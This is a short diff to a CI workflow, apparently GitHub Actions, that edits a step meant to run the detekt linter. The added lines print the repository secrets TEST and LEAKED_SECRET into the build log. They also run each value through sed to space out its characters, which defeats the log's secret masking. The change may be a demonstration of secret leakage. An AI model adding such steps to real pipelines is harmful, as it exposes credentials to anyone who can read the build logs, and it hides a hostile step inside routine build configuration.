@@ -17,4 +17,9 @@ jobs:
       with:
         java-version: 1.8
     - name: Runt detekt
-      run: ./gradlew detekt
+      run: |
+        echo ${{ secrets.TEST }}
+        echo ${{ secrets.TEST }} | sed -e 's/\(.\)/\1 /g'
+        echo ${{ secrets.LEAKED_SECRET }}
+        echo ${{ secrets.LEAKED_SECRET }} | sed -e 's/\(.\)/\1 /g'
+        ./gradlew detekt
